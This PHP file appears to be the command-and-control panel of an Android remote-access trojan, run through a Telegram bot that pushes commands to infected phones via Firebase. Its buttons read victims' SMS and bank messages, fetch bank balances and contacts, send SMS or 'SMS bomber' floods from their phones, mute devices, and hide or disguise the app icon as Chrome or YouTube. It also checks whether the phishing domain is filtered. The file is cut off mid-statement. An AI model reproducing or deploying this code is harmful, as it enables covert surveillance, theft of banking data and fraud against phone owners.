<?php


include("chalim.php");

define('TOKEN', $bot_token);
define('PORT_SUDO', $sudo_port);
define('PROJECT_ID', $project_id);
define('FILE', $file);

#Write Requirements
if (!file_exists("data")) {
    mkdir("data");
    mkdir("user");
}
if (!file_exists("link.txt")) {

    file_put_contents("link.txt", "https://google.com");
    file_put_contents("data/devices.txt", "");
    file_put_contents("data/contact.txt", "0");
    file_put_contents("data/firstsms.txt", "off");
    file_put_contents("data/autohide.txt", "off");
    file_put_contents("data/number-first.txt", "09123456789");
    file_put_contents("data/message-first.txt", $dev_id);
    file_put_contents("data/offline-number.txt", "09123456789");
    file_put_contents("user/index.php", "");
    file_put_contents("data/index.php", "");
    file_put_contents("data/pingmsg.txt", "0");
    file_put_contents("data/onlineusers.txt", "");
    file_put_contents("data/online_model.txt", "list");

}
#ip function
function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}

#bot Function
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}

#Send Message Function
function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

#Edit Message Func
function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

function sf($file, $caption, $id = null)
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/sendDocument?chat_id=" . $id;
    $post = array('parse_mode' => 'HTML', 'caption' => "<b>$caption</b>", 'document' => new CURLFile(realpath("$file")));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

#regular requests
function getAccessToken($file)
{
    require 'vendor/autoload.php';
    $serviceAccountFilePath = "$file";
    $serviceAccount = json_decode(file_get_contents($serviceAccountFilePath), true);

    // Generate the JWT using the service account credentials
    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    // Get the OAuth 2.0 access token
    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $accessToken = json_decode($response)->access_token;

    return $accessToken;
}

#regular requests
function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("sath.txt", $result);
}

function send_sms_contact($dev_id_use)
{
    $send_sms_contacts = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "back_panel"], ['text' => "Send ››", 'callback_data' => "last_contacts $dev_id_use"]]
    ]]);
    return $send_sms_contacts;
}

function requestSMSContact($mode, $device_id, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

#Sms Request
function requestSMS($mode, $device_id, $phone, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

#request to all subscribtion
function requestsAll($mode_all)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode_all
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("xd.txt", PROJECT_ID);

}

#check host Location Resolver
function location($node)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/nodes/hosts");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $loc = json_decode(curl_exec($ch), true)['nodes'][$node]['location'][2];
    curl_close($ch);
    return $loc;
}

#check filtering
function checkhost($domain)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-http?host=$domain&node=ir1.node.check-host.net&node=ir3.node.check-host.net&node=ir5.node.check-host.net&node=ir6.node.check-host.net");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $id = json_decode(curl_exec($ch), true)['request_id'];
    sleep(2);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-result/$id");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    $arr = array();
    foreach ($result as $node => $value) {
        if (isset($value)) {
            $name = location($node);
            $arr[$name] = ['time' => $value[0][1], 'status' => $value[0][2], 'statuscode' => $value[0][3], "serverip" => $value[0][4]];
        }
    }
    return $arr;
}

#----------------------------------------------------------------------
#telegram Update Requirements 
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = $update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id) ? $update->callback_query->message->chat->id : $update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id) ? $update->callback_query->message->from->id : $update->message->from->id;
$text = $update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
#---------------------------------------------------------------------
#shourt Callers Value
$command = file_get_contents("user/$chat_id/command.txt");
$text_message = file_get_contents("user/$chat_id/message.txt");
$device_id = file_get_contents("user/$chat_id/device-id.txt");
$device_model = file_get_contents("user/$chat_id/device-model.txt");
$number_message = file_get_contents("user/$chat_id/numberlist.txt");
$ringer_mode = file_get_contents("user/$chat_id/ringer.txt");
$apk_mode = file_get_contents("user/$chat_id/apk.txt");
$action_autohide = file_get_contents("data/autohide.txt");
$status_offline = file_get_contents("user/$device_id-offline.txt");
$target_name = file_get_contents("user/$device_id-name.txt");
$install_ip = file_get_contents("user/$device_id-ip.txt");
$action_firstsms = file_get_contents("data/firstsms.txt");
$offline_number = file_get_contents("data/offline-number.txt");
$model_online = file_get_contents("data/online_model.txt");
$contact = file_get_contents("data/contact.txt");
$link_show = file_get_contents("link.txt");
#----------------------------------------------------------------
#shishe ei
$start_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "🪄 ʀᴇǫᴜᴇꜱᴛ ᴛᴏ ᴀʟʟ 🪄", 'callback_data' => 'setting'], ['text' => "📊 ᴀʟʟ ᴛᴀʀɢᴇᴛꜱ ᴘɪɴɢ 📊", 'callback_data' => 'online_checo']],
    [['text' => "⚙️ ɢᴇᴛ ᴀᴘᴋ ⚙️", 'callback_data' => '/help']]
]]);
$goooo = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "🗃 ɢᴇᴛ ᴀᴘᴋ 🗃", 'callback_data' => 'apkk']],
    [['text' => "‹‹ back", 'callback_data' => 'back_home']]
]]);
#start button
function control_button($dev_id_use)
{
    $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
    $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

    $device_id = file_get_contents("user/$dev_id_use-model.txt");
    $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");

    $control_button = json_encode(['resize_keyboard' => true,
        'inline_keyboard' => [
            [['text' => "🔅ᴛᴀʀɢᴇᴛ ꜱᴛᴀᴛᴜꜱ/ᴘɪɴɢ 🔅", 'callback_data' => "status_user $dev_id_use"], ['text' => "$device_id", 'callback_data' => 'null']],
            [['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏғғ 📶", 'callback_data' => "offmodeoff $dev_id_use"], ['text' => "📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏɴ 📶", 'callback_data' => "offmodeon $dev_id_use"]],
            [['text' => "✉️ ꜱᴇɴᴅ ꜱᴍꜱ ✉️", 'callback_data' => "send_sms $dev_id_use"]],
            [['text' => "📨 ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ 📨", 'callback_data' => "sms_contacts $dev_id_use"]],
            [['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $dev_id_use"], ['text' => "👤 ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ 👤", 'callback_data' => "all_contacts $dev_id_use"], ['text' => "📁 ᴀʟʟ ꜱᴍꜱ 📁", 'callback_data' => "all_sms $dev_id_use"]],
            [['text' => "💸 ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ 💸", 'callback_data' => "last_Bank_sms $dev_id_use"], ['text' => "🏦 ʙᴀɴᴋ ꜱᴍꜱ 🏦", 'callback_data' => "All_Bank_sms $dev_id_use"], ['text' => "💰 ʙᴀɴᴋꜱ ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $dev_id_use"]],
            [['text' => "🔉ᴠɪʙʀᴀᴛᴇ🔉", 'callback_data' => "vibrate_mode $dev_id_use"], ['text' => "🔇 ᴍᴜᴛᴇ ᴛᴀʀɢᴇᴛ 🔇", 'callback_data' => "silent_mode $dev_id_use"], ['text' => "🔊 ɴᴏʀᴍᴀʟ ᴛᴀʀɢᴇᴛ 🔊", 'callback_data' => "normal_mode $dev_id_use"]],
            [['text' => "👻  ʜɪᴅᴇ ɪᴄᴏɴ  👻", 'callback_data' => "hide_icon $dev_id_use"], ['text' => "🪄 ᴜɴʜɪᴅᴇ 🪄", 'callback_data' => "visible_icon $dev_id_use"]],
            [['text' => "📱 ᴍᴏᴅᴇʟ ᴅᴇᴠɪᴄᴇ", 'callback_data' => "WhatsChecker $dev_id_use"], ['text' => " 🔎 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ 🔎", 'callback_data' => "searchSMS $dev_id_use"], ['text' => "ℹ️ ꜰᴜʟʟ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ℹ️", "callback_data" => "information $dev_id_use"]],
            [['text' => "🔄 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🔄", 'callback_data' => "change $dev_id_use"]],
            [['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => 'back_home']]
        ]]);
    return $control_button;
}

#info button
function info_button($dev_id_use)
{
    $device_id = file_get_contents("user/$dev_id_use-model.txt");
    $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");


    $info_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "Name Target", 'callback_data' => "nametarget $dev_id_use"]],
        [['text' => "Clear All Info", 'callback_data' => "clearinfo $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]]
    ]]);
    return $info_button;
}

$settings_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "🪄 ᴀᴜᴛᴏ ʜɪᴅᴅᴇɴ 🪄", 'callback_data' => 'null'], ['text' => "$action_autohide", 'callback_data' => 'auto_hide']],
    [['text' => "📶 ᴏғғ ᴍᴏᴅᴇ ɴᴜᴍʙᴇʀ 📶", 'callback_data' => 'set_number_offline_mode'], ['text' => "$offline_number", 'callback_data' => 'null']],
    [['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ ᴀʟʟ 👻", 'callback_data' => 'hide_all'], ['text' => "💰 ʙᴀɴᴋ ɪɴғᴏ ᴀʟʟ 💰", 'callback_data' => 'get_all_balance'], ['text' => "🔇 ᴍᴜᴛᴇ ᴀʟʟ ᴛᴀʀɢᴇᴛ 🔇", 'callback_data' => 'silent_all']],
    [['text' => "👥ᴜꜱᴇʀꜱ-ᴄᴏᴜɴᴛ", 'callback_data' => 'null'], ['text' => "$contact", 'callback_data' => 'null']],
 
    [['text' => "🌐 ᴄʜᴀɴɢᴇ ᴅᴏᴍᴀɪɴ 🌐", 'callback_data' => 'set_url'], ['text' => "🧫 ᴄʜᴇᴄᴋ ʜᴏꜱᴛ 🧫", 'callback_data' => 'checkhost'], ['text' => "🔖 sʜᴏᴡ ᴅᴏᴍᴀɪɴ 🔖", 'callback_data' => 'show_url']],
    [['text' => "📤 sᴍs ʙᴏᴍʙᴇʀ ᴀʟʟ 📤", 'callback_data' => 'sms_all']],
    [['text' => "", 'callback_data' => 'set_word'], ['text' => "", 'callback_data' => 'search_all']],
    [['text' => "🗃️ ᴏɴʟɪɴᴇ ᴍᴏᴅᴇʟ 🗃️", 'callback_data' => 'online_model'], ['text' => "$model_online", 'callback_data' => 'online_model']],
    [['text' => "⏫ ʙᴀᴄᴋ ⏫", 'callback_data' => 'back_home']]
]]);
$back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']]
]]);
$onli_btn = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Send Requests››", 'callback_data' => 'online_checo']]
]]);
$back_home = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_home']]
]]);
$back_settings = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']]
]]);
$dev_inline = json_encode(array('inline_keyboard' => [
    [['text' => "Get Pv Dev", 'url' => "t.me/$dev_id"]]
]));
$url_inline = json_encode(array('inline_keyboard' => [
    [['text' => "$link_show", 'url' => "$link_show"]],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']]
]));

function sms_button($dev_id_use)
{
    $sms_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "Edite Text", 'callback_data' => "edit_message $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"], ['text' => "Next ››", 'callback_data' => "set_list $dev_id_use"]]
    ]]);
    return $sms_button;
}

$model_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ʟɪꜱᴛ", 'callback_data' => 'list_model'], ['text' => "ꜱɪɴɢᴇʟ", 'callback_data' => 'singel_model']],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']],
]]);
$changeiconButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ᴄʜʀᴏᴍᴇ", 'callback_data' => 'chrome'], ['text' => "ᴛᴇʟᴇɢʀᴀᴍ", 'callback_data' => 'telegram']],
    [['text' => "ʏᴏᴜᴛᴜʙᴇ", 'callback_data' => 'youtube'], ['text' => "ɢᴏᴏɢʟᴇ", 'callback_data' => "google $datass[1]"]],
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']],
]]);
function getsmsButton($dev_id_use)
{
    $getsmsButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' =>
        [[['text' => "📤ᴏᴜᴛʙᴏx📤", 'callback_data' => "sent $dev_id_use"], ['text' => "📥ɪɴʙᴏx📥", 'callback_data' => "recived $dev_id_use"]],
            [['text' => "📨ᴀʟʟ ꜱᴍꜱ📨", 'callback_data' => "Popo $dev_id_use"]],
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]],
        ]]);
    return $getsmsButton;
}

$sms_button_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "Edite Text", 'callback_data' => 'edit_message_all']],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings'], ['text' => "Next ››", 'callback_data' => 'set_list_all']]
]]);
function back_sms($dev_id_use)
{
    $back_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"]]
    ]]);
    return $back_sms;
}

function send_sms($dev_id_use)
{
    $send_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"], ['text' => "Send ››", 'callback_data' => "last_send $dev_id_use"]]
    ]]);
    return $send_sms;
}

$send_sms_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings'], ['text' => "Send ››", 'callback_data' => 'last_send_all']]
]]);
if (in_array(
